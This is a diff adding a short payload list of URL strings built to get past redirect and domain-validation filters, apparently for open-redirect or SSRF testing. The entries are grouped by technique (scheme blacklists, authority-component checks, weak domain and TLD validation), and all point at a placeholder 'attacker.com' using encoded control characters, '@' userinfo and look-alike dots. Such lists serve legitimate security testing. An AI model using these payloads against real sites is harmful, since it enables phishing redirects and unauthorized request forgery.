@@ -1,0 +1,30 @@
+# Bypass a HTTP scheme blacklist
+//attacker.com
+/%0A/attacker.com
+/%0D/attacker.com
+/%09/attacker.com
+/+/attacker.com
+///attacker.com
+\\attacker.com
+
+# Bypass a URI authority component (//) blacklist
+http:example.com
+https:example.com
+
+# Bypass weak domain validation
+https://example.com@attacker.com
+https://example.com.attacker.com
+https://attacker.com/example.com
+https://attacker.com?example.com
+https://attacker.com%23example.com
+https://attacker.com%00example.com
+https://attacker.com%0Aexample.com
+https://attacker.com%0Dexample.com
+https://attacker.com%09example.com
+https://example.com°attacker.com
+
+# Bypass weak top-level domain (TLD) validation
+https://example.comattacker.com
+https://example.com.mx
+https://example.company                                  # .company is a valid TLD
+https://attacker.com%E3%80%82example.com                 # URL encoded Chinese dot
